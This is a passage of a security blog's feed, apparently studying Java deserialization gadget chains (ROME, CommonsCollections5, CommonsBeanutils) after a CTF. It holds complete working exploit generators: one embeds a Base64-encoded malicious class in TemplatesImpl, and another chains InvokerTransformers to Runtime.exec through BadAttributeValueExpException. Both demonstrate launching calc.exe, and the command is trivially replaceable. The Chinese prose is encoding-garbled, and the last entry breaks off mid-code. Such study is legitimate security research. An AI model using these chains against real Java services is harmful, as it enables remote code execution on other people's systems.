delegate.toString();<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±è¦æ€è€ƒå¦‚ä½•åŠ å…¥<strong>ååºåˆ—åŒ–</strong>ã€‚</p><h2 id="ObjectBean-hashCode"><a href="#ObjectBean-hashCode" class="headerlink" title="ObjectBean#hashCode"></a>ObjectBean#hashCode</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061420042.png" alt="QQæˆªå›¾20220306114759"></p><p>è·Ÿè¿›<strong>beanHashCode()</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061206491.png" alt="QQæˆªå›¾20220306114855"></p><p>ç„¶åæˆ‘ä»¬å°±è¦è€ƒè™‘è¿™é‡Œæ€ä¹ˆå›è°ƒåˆ°<strong>ObjectBean#toString</strong>ï¼Ÿäº‹å®ä¸Šæˆ‘ä»¬å¯ä»¥è¿›è¡Œå¤šé‡å°è£…ã€‚æ¯”å¦‚è¿™æ ·ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(String.class, <span class="hljs-string">&quot;xsw6a&quot;</span>));<br></code></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬ä¸ä»…è°ƒç”¨äº†<strong>ObjectBean#hashCode</strong>è¿˜è°ƒç”¨äº†<strong>ObjectBean#toString</strong>ã€‚ä¸ºäº†é¿å…åœ¨åºåˆ—åŒ–ä¹‹å‰å°±å¼¹å‡ºè®¡ç®—å™¨ã€‚æˆ‘ä»¬å¯ä»¥åœ¨putè¿›mapä¸­ä¹‹ååœ¨è¿›è¡Œ<strong>åå°„</strong>ä¿®æ”¹å€¼å°±å¯ä»¥äº†ã€‚</p><h2 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap#readObject"></a>HashMap#readObject</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061420627.png" alt="QQæˆªå›¾20220306134313"><br>è·Ÿè¿›hashã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061343916.png" alt="QQæˆªå›¾20220306134328"><br>è¿™é‡Œä¼šè°ƒç”¨**key.hashCode()**ã€‚<br>è¿™é‡Œå¾—keyå¯ä»¥æ§åˆ¶ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¸€æ¡å®Œæ•´å¾—é“¾å­å°±å‡ºæ¥äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RomeDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(String.class, <span class="hljs-string">&quot;xsw6a&quot;</span>));<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(root, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;xsw6a&quot;</span>, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> ObjectBean.class.getDeclaredField(<span class="hljs-string">&quot;_equalsBean&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(root, <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ObjectBean.class, delegate));<br><br>        serialize(map);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonCollections5</title>
    <link href="/2022/03/05/CommonCollections5/"/>
    <url>/2022/03/05/CommonCollections5/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonCollections5"><a href="#CommonCollections5" class="headerlink" title="CommonCollections5"></a>CommonCollections5</h1><p>è¿˜æ˜¯å†çœ‹romeé“¾ï¼Œçœ‹åˆ°æœ‰åˆ©ç”¨<strong>BadAttributeValueExpException</strong>å°±æƒ³èµ·cc5ã€‚å€Ÿæ­¤å¤ä¹ ä¸‹å§ã€‚</p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream.readObject()<br>            BadAttributeValueExpException.readObject()<br>                TiedMapEntry.toString()<br>                    LazyMap.get()<br>                        ChainedTransformer.transform()<br>                            ConstantTransformer.transform()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Class.getMethod()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.getRuntime()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.exec()<br></code></pre></td></tr></table></figure><h2 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2><p>å€¼å¾—æ³¨æ„çš„ä¸‰ä¸ªä¸ªåœ°æ–¹ã€‚<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203052221266.png" alt="QQæˆªå›¾20220305220944"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203052221136.png" alt="QQæˆªå›¾20220305220912"></p><p>åœ¨è°ƒç”¨<strong>toString</strong>çš„æ—¶å€™ä¼šè·‘åˆ°<strong>getValueï¼ˆï¼‰</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203052221203.png" alt="QQæˆªå›¾20220305221112"></p><p>ç„¶åè°ƒç”¨<strong>get</strong>ï¼Œè¿™é‡Œå°±è·ŸLazyMapåé¢çš„é“¾å­å·®ä¸å¤šã€‚<br>ä¸‹é¢å°±è¦æ‰¾ååºåˆ—åŒ–çš„ç‚¹ã€‚</p><h1 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h1><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203052221228.png" alt="QQæˆªå›¾20220305221328"></p><p>å¯ä»¥é€šè¿‡åå°„æ„é€ ã€‚é‚£ä¹ˆä¸€æ¡å®Œæ•´çš„é“¾å­å°±å‡ºæ¥äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc5Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(decorate,<span class="hljs-number">123</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br>       serialize(badAttributeValueExpException);<br>       unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsBeanutilsï¼ˆæ— ccä¾èµ–ï¼‰</title>
    <link href="/2022/03/05/CommonsBeanutils%EF%BC%88%E6%97%A0cc%E4%BE%9D%E8%B5%96%EF%BC%89/"/>
    <url>/2022/03/05/CommonsBeanutils%EF%BC%88%E6%97%A0cc%E4%BE%9D%E8%B5%96%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h1><p>æ˜¨å¤©åšåˆ°D3CTFæ¯”èµ›çš„ä¸€é“é¢˜ï¼Œemmmç™½å·ä¸€æ™šä¸Šã€‚åé¢çœ‹æ˜¯ROMEï¼Œç„¶åçœ‹äº†çœ‹ç½‘ä¸Šçš„ROMEé“¾ï¼Œè¦ç”¨åˆ°<strong>CommonsBeanutils</strong>ï¼Œä»Šå¤©å°±æ¥å¤ä¹ ä¸‹<strong>CommonsBeanutils</strong>ã€‚</p><h2 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h2><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br>         xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>         xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;<br>    &lt;modelVersion&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/modelVersion&gt;<br><br>    &lt;groupId&gt;org.example&lt;/groupId&gt;<br>    &lt;artifactId&gt;commonsbeanutils&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.0</span>-SNAPSHOT&lt;/version&gt;<br><br>    &lt;properties&gt;<br>        &lt;maven.compiler.source&gt;<span class="hljs-number">8</span>&lt;/maven.compiler.source&gt;<br>        &lt;maven.compiler.target&gt;<span class="hljs-number">8</span>&lt;/maven.compiler.target&gt;<br>    &lt;/properties&gt;<br>    &lt;dependencies&gt;<br>        &lt;dependency&gt;<br>            &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;<br><br>        &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;<br><br>        &lt;version&gt;<span class="hljs-number">1.8</span><span class="hljs-number">.3</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br><br>        &lt;dependency&gt;<br><br>            &lt;groupId&gt;org.javassist&lt;/groupId&gt;<br><br>            &lt;artifactId&gt;javassist&lt;/artifactId&gt;<br><br>            &lt;version&gt;<span class="hljs-number">3.21</span><span class="hljs-number">.0</span>-GA&lt;/version&gt;<br><br>        &lt;/dependency&gt;<br>    &lt;/dependencies&gt;<br>&lt;/project&gt;<br></code></pre></td></tr></table></figure><p>è·Ÿç€pç¥èµ°ã€‚<br>commons-beanutilsä¸­æä¾›äº†è¿™æ ·ä¸€ä¸ªæ–¹æ³•ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051437577.png" alt="QQæˆªå›¾20220305143634"></p><p>ç®€å•æ¥è¯´å°±æ˜¯å¯ä»¥è¯»å–å±æ€§ä¸­çš„è¯»æ–¹æ³•å³getNameæ–¹æ³•ã€‚å½“ç„¶è¿™é‡Œè¦æ»¡è¶³ç‰¹æ®Šçš„å‘½åæ–¹å¼ã€‚getN(å¤§å†™)ameã€‚</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">final</span> <span 